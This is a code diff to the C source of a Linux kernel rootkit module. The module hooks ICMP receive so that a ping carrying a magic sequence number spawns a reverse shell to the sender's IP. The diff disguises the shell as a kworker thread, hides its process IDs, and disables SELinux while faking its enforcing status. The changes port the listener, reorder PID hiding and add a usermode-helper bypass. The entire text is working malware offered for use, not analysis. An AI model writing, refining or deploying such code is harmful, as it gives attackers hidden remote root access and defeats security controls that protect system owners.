@@ -4,8 +4,7 @@
 #include "../ftrace/ftrace_helper.h"
 #include <linux/fs.h>
 
-
-#define SRV_PORT "8081"
+#define SRV_PORT "18081"
 #define ICMP_MAGIC_SEQ 1337
 #define PROC_NAME "[kworker/0:1]"
 #define IP_MF       0x2000   // More fragments flag
@@ -15,10 +14,7 @@
 static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
 static asmlinkage ssize_t (*orig_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
 static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __user *, size_t, loff_t *);
-
 extern __be32 your_srv_ip;
-
-
 
 struct revshell_work {
     struct work_struct work;
@@ -27,6 +23,7 @@ struct revshell_work {
 static void *selinux_state_ptr = NULL;
 static bool enforce_hook_active = false;
 static int fake_enforce_value = 1;
+
 
 notrace static asmlinkage ssize_t hook_sel_write_enforce(
     struct file *filp,
@@ -91,14 +88,13 @@ notrace static int bypass_selinux_disable(void)
 
     #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
     state->enforcing = 0;
-
     enforce_hook_active = true;
-
     fake_enforce_value = 1;
     #endif
 
     return 0;
 }
+
 notrace static void spawn_revshell(struct work_struct *work)
 {
     char cmd[768];
@@ -108,19 +104,24 @@ notrace static void spawn_revshell(struct work_struct *work)
         "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
         NULL
     };
-    char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", NULL, NULL};
+    char *argv[] = {"/bin/bash", "-c", cmd, NULL};
     struct subprocess_info *sub_info;
-    struct task_struct *task;
-    pid_t baseline_pid = 0;
+    extern void enable_umh_bypass(void);
+    extern void disable_umh_bypass(void);
+    enable_umh_bypass();
+    add_hidden_pid(current->pid);
+    add_hidden_pid(current->tgid);
     bypass_selinux_disable();
+    msleep(50);
     struct file *file;
     char *path = "/usr/bin/socat";  // Path to check
         file = filp_open(path, O_RDONLY, 0);
     char ip_buf[16];  // xxx.xxx.xxx.xxx + NUL
     snprintf(ip_buf, sizeof(ip_buf), "%pI4", &your_srv_ip);
 
+
         if (IS_ERR(file)) {
-    snprintf(cmd, sizeof(cmd),
+   snprintf(cmd, sizeof(cmd),
              "bash -c '"
              "PID=$$; "
              "kill -59 $PID 2>/dev/null; "
@@ -135,27 +136,15 @@ notrace static void spawn_revshell(struct work_struct *work)
         filp_close(file, NULL);
     }
 
-        argv[3] = cmd;
-    rcu_read_lock();
-    for_each_process(task) {
-        if (task->pid > baseline_pid)
-            baseline_pid = task->pid;
-    }
-    rcu_read_unlock();
+
+
+
+
+
     sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
     if (sub_info)
         call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
-    rcu_read_lock();
-    for_each_process(task) {
-        if (task->pid > baseline_pid && task->mm) {
-            if (strstr(task->comm, PROC_NAME) ||
-                strstr(task->comm, "setsid")) {
-                add_hidden_pid(task->pid);
-                add_hidden_pid(task->tgid);
-            }
-        }
-    }
-    rcu_read_unlock();
+    disable_umh_bypass();
     kfree(container_of(work, struct revshell_work, work));
 }
 
@@ -183,7 +172,7 @@ notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
     if (iph->saddr == trigger_ip &&
         icmph->type == ICMP_ECHO &&
         ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
-            your_srv_ip = trigger_ip;
+        your_srv_ip = trigger_ip;
         rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
         if (rw) {
             INIT_WORK(&rw->work, spawn_revshell);
